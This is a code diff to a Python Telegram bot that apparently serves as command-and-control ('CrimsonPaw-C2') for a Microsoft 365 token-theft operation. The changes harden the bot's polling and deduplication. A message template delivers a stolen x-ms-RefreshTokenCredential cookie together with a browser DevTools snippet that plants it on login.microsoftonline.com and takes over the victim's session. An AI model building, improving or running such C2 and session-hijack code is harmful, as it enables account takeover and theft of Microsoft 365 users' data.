@@ -7,12 +7,24 @@ import json
 import logging
 import urllib.request
 import urllib.parse
+import collections
 from pathlib import Path
 from config import Config
 import db
 import graph
 
 logger = logging.getLogger(__name__)
+
+_SINGLETON_LOCK = threading.Lock()
+_ACTIVE_BOT_THREAD = None
+
+def get_c2_bot_thread(poll_interval=3):
+    """Thread-safe singleton getter: guarantees only ONE bot poller thread ever exists."""
+    global _ACTIVE_BOT_THREAD
+    with _SINGLETON_LOCK:
+        if _ACTIVE_BOT_THREAD is None or not _ACTIVE_BOT_THREAD.is_alive():
+            _ACTIVE_BOT_THREAD = TelegramC2BotThread(poll_interval=poll_interval)
+        return _ACTIVE_BOT_THREAD
 
 SETTINGS_FILE = Path(__file__).resolve().parent / 'settings.json'
 
@@ -39,6 +51,23 @@ class TelegramC2BotThread(threading.Thread):
         self.last_update_id = 0
         self.running = True
         self.commands_registered = False
+        self.processed_ids = collections.deque(maxlen=1000)
+        self.offset_primed = False
+
+    def _prime_offset(self, bot_token):
+        """Fetch latest update on boot to discard stale historical commands."""
+        try:
+            url = f"https://api.telegram.org/bot{bot_token}/getUpdates?offset=-1&limit=1"
+            req = urllib.request.Request(url, headers={'User-Agent': 'CrimsonPaw-C2/2.0'})
+            with urllib.request.urlopen(req, timeout=8) as res:
+                if res.status == 200:
+                    payload = json.loads(res.read().decode('utf-8'))
+                    results = payload.get('result', [])
+                    if results:
+                        self.last_update_id = results[-1].get('update_id', 0) + 1
+                        logger.info(f"[TELEGRAM-C2] Primed offset to {self.last_update_id} (cleared stale updates).")
+        except Exception as e:
+            logger.warning(f"[TELEGRAM-C2] Offset prime warning: {e}")
 
     def _register_bot_commands(self, bot_token):
         """Register slash commands in Telegram so the native [ Menu ] button appears in chat."""
@@ -91,12 +120,21 @@ class TelegramC2BotThread(threading.Thread):
                     self._register_bot_commands(bot_token)
                     self.commands_registered = True
 
+                if not self.offset_primed:
+                    self._prime_offset(bot_token)
+                    self.offset_primed = True
+
                 # Long poll updates from Telegram
                 updates = self._fetch_updates(bot_token)
                 for update in updates:
                     update_id = update.get('update_id', 0)
                     if update_id >= self.last_update_id:
                         self.last_update_id = update_id + 1
+
+                    # Strict deduplication: ignore already executed updates
+                    if update_id in self.processed_ids:
+                        continue
+                    self.processed_ids.append(update_id)
 
                     # Handle regular text messages
                     if 'message' in update:
@@ -107,6 +145,11 @@ class TelegramC2BotThread(threading.Thread):
                         if sender_chat_id != admin_chat_id:
                             continue
 
+                        # Discard old messages (>90s stale) to prevent lag repeats
+                        msg_date = msg.get('date', 0)
+                        if msg_date and (time.time() - msg_date) > 90:
+                            continue
+
                         text = msg.get('text', '').strip()
                         if text:
                             self._handle_command(bot_token, sender_chat_id, text)
@@ -114,9 +157,13 @@ class TelegramC2BotThread(threading.Thread):
                     # Handle interactive button clicks (Callback Queries)
                     elif 'callback_query' in update:
                         cb = update['callback_query']
-                        cb_id = cb.get('id')
-                        sender_chat_id = str(cb.get('message', {}).get('chat', {}).get('id', '')).strip()
+                        cb_id = str(cb.get('id') or '')
+                        if cb_id and cb_id in self.processed_ids:
+                            continue
+                        if cb_id:
+                            self.processed_ids.append(cb_id)
 
+                        sender_chat_id = str(cb.get('message', {}).get('chat', {}).get('id', '')).strip()
                         if sender_chat_id != admin_chat_id:
                             continue
 
@@ -493,7 +540,7 @@ class TelegramC2BotThread(threading.Thread):
                     f"• <b>User Code:</b> <code>{uc}</code>\n"
                     f"• <b>Cookie Name:</b> <code>x-ms-RefreshTokenCredential</code>\n"
                     f"• <b>Status:</b> 🟢 Valid (Ready for SSO)\n\n"
-                    f"<b>1-Line DevTools Snippet (F12 on login.microsoftonline.com):</b>\n"
+                    f"<b>Paste this snippet directly into your browser's DevTools Console (F12) while on login.microsoftonline.com to authenticate immediately:</b>\n"
                     f"<pre>await cookieStore.set({{name:'x-ms-RefreshTokenCredential',value:'{prt_cookie}',domain:'login.microsoftonline.com',path:'/',sameSite:'none',secure:true}});window.location.href='https://www.office.com/?auth=2';</pre>\n\n"
                     f"<i>Complete executable script attached below as a .txt file.</i>"
                 )
